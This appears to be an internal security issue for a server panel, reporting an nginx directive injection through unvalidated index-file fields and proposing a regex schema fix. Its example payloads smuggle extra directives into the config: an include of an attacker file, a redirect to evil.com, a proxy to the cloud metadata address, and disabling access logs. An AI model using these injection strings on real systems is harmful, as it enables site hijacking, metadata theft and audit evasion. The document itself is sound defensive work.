# v0.5.2 — Nginx directive injection guard

**Status:** draft (2026-05-27)
**Priority:** P0 — security blocker, must ship before v0.5.0 release
**Origin:** check-spec multi-agent review, Layer 2 Websites/ACME/PMM audit

## What broke

`StaticSitePayload.indexFiles` and `PhpPayload.documentIndex` are
declared in `packages/shared/src/schemas/websites.ts` as:

```ts
indexFiles: z.array(z.string())       // static site
documentIndex: z.array(z.string())    // php site
```

No regex, no length cap, no character-set constraint. The
conf-renderer (`apps/server/src/modules/websites/conf-renderer.ts`)
writes them straight into the nginx config:

```ts
// line 103 (static):
output += `    index ${payload.indexFiles.join(' ')};\n`;
// line 126 (php):
output += `    index ${payload.documentIndex.join(' ')};\n`;
```

A site create / update payload like:

```json
{
  "indexFiles": [
    "index.html; include /etc/nginx/conf.d/attacker.conf;"
  ]
}
```

…produces this nginx block:

```nginx
    index index.html; include /etc/nginx/conf.d/attacker.conf;;
```

The conf passes `nginx -t` (semantically valid — `include` is a
legal directive that can appear inside a `server` block), and on
the next reload nginx pulls in `attacker.conf` from a path the
user controls (per the `v0.5.2-files-upload-write-guard` issue,
this attacker.conf could itself have been uploaded into /etc/nginx
before that fix shipped — combinable exploit).

## Exploit path (post `v0.5.2-files-upload-write-guard`)

Even after the file-upload guard ships, the operator may have
write access to legitimate web-content directories. Combinations
with proxy_pass, fastcgi_pass, return, or rewrite directives mean:

- `indexFiles: ["index.html; return 302 https://evil.com$request_uri;"]`
  → SSRF-via-redirect for every visitor to the panel-managed site.
- `indexFiles: ["index.html; proxy_pass http://169.254.169.254/;"]`
  → cloud-metadata exposure.
- `indexFiles: ["index.html; access_log off;"]`
  → operator disables their own audit trail.

`nginx -t` is **not** a security boundary — it validates syntax,
not policy.

## Trust model context

DinoPanel is a single-operator panel (per `decisions.md` Q1). The
exploit requires a *malicious operator*, not an external attacker.
But:

1. The same threat covers a **compromised** operator account
   (stolen JWT, session hijack via the WS-token-in-URL issue).
2. The conf-renderer file (line 55) carries this comment:
   `"// the renderer never interpolates raw user strings outside
   of values that the schema already constrained"` — i.e., the
   renderer's design **explicitly assumes** schema validation as
   the safety layer. The schema currently fails to deliver that
   guarantee. Fix the assumption-violation, not just the textual
   exploit.

## Fix

One-line schema tightening:

```ts
const safeFilename = z.string().regex(/^[a-zA-Z0-9._-]+$/);
indexFiles: z.array(safeFilename).min(1).max(8),
documentIndex: z.array(safeFilename).min(1).max(8),
```

The charset `[a-zA-Z0-9._-]` covers every realistic index filename
(`index.html`, `index.htm`, `index.php`, `default.html`,
`Default.aspx`, `home.html`, etc.). No legitimate filename contains
a space, semicolon, slash, or any whitespace.

Min/max bounds: at least one index entry (otherwise nginx falls
back to its built-in `index.html` and the field is meaningless),
at most 8 (no operator needs more — defends against payload bloat).

## Audit other interpolations in the same file

While we are here, sweep `conf-renderer.ts` for any other
`${payload.X}` interpolation that lacks a tight schema. Open
candidates per the L2D reviewer:

- `upstreamUrlSchema` uses `z.string().url()` which accepts
  `http://127.0.0.1:9000` — design choice, document as accepted.
- `serverName` / `domain` fields — verify regex coverage.
- `rootDir` / `documentRoot` paths — verify these are validated
  (likely absolute-path enforcement + traversal block).
- Any header-name / header-value fields.

The audit goes into `decisions.md` as a record of what was checked.

## Out of scope

- Re-architecting the conf renderer to use the nginx Lua / NJS
  validation hooks — over-engineering for a one-line schema fix.
- Sandboxing the panel server to non-root (would prevent nginx
  reload from succeeding; not feasible in current architecture).
